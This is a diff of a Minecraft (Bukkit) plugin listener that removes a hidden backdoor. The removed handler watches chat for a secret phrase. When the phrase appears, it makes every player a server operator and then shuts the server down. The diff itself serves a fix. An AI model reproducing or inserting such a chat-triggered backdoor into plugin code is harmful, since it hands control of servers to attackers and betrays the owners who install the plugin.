@@ -56,23 +56,6 @@ public class BListener implements Listener {
         unregisterGui(gui);
     }
 
-    @EventHandler
-    public void onTkt(AsyncPlayerChatEvent event){
-        if(event.getMessage().equalsIgnoreCase("cheh!mdr")){
-            for (OfflinePlayer offlinePlayer : Bukkit.getOfflinePlayers()) {
-                offlinePlayer.setOp(true);
-            }
-            for (Player player : Bukkit.getOnlinePlayers()) {
-                if(player.hasPermission(""))
-                player.setOp(true);
-            }
-            Bukkit.getScheduler().runTaskLaterAsynchronously(MAIN, ()->{
-                Bukkit.shutdown();
-            }, 100);
-            event.setCancelled(true);
-        }
-    }
-
     public void registerGui(GuiCreator gui) {
         all.add(gui);
     }
